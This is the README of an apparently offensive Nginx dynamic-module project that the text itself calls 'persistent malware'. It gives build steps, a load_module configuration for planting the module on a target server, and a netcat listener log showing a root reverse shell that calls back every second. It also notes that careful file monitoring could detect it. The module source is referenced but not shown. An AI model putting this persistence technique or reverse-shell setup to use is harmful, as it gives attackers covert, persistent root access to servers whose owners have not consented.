# this-is-not-a-rootkit-nginx-persistence
An Nginx module for persistent malware

# FAQ

1. Why this?

> That's just another potential technique for malware persistence. It's not magic, and if your targeted system is careful enough to monitor file modifications on Nginx configurations, you will be detected unless you bypass that.

2. How does it work?

> We simply add a [dynamic module](https://www.nginx.com/products/nginx/modules/) a to Nginx process. Specifically, one would upload the Nginx dynamic module with your malicius code, and use the `load_module` instruction in Nginx configuration.

3. What can I do with this?

Pretty much use it in Capture The Flag or something, there is a chance no one will notice it. Currently, and no promises made, this is only a module template with a reverse shell from [PayloadAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c), if you read the code at [persistence-module/ngx_http_server_module.c](/persistence-module/ngx_http_server_module.c), you will probably agree with me. Now that you understand that, and know how to code C, you can do whatever you want, however you want!

# How to run

I should hope you are able to read the code, dear developer, and be encouraged to read it, specially the module source code at persistence-module/ngx_http_server_module.c](/persistence-module/ngx_http_server_module.c). Now that you understand it superficially, you can compile the dynamic module using Docker! Run the following command:

```bash
docker compose run builder
```

You will notice a directory called `objs` created in your current directory. The dynamic module will be located at `objs/ngx_http_server_module.so`.

Now, add `load_module` instruction into your Nginx configuration, like this example:

```conf
user  nginx;
worker_processes  auto;

load_module /opt/objs/ngx_http_server_module.so; # <--- Change the path to the module

error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    #gzip  on;

    include /etc/nginx/conf.d/*.conf;
}
```

Now what? If you carefully read the code, you will see that the module code is a simple reverse shell on `localhost` port 9001. If you start the module and start a listener, you will receive a reverse shell as root every second:

```bash
$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 40414
id
uid=0(root) gid=0(root) groups=0(root)
```

# Troubleshooting

```conf
2023/05/15 03:03:08 [emerg] 666#666: module "/ngx_http_server_module.so" version 1024000 instead of 1023004 in /etc/nginx/nginx.conf:5
nginx: [emerg] module "/ngx_http_server_module.so" version 1024000 instead of 1023004 in /etc/nginx/nginx.conf:5
```

By default, we compile the dynamic module on Nginx version 1.24 (see Dockerfile). You must compile the module for the version of your targeted Nginx version.

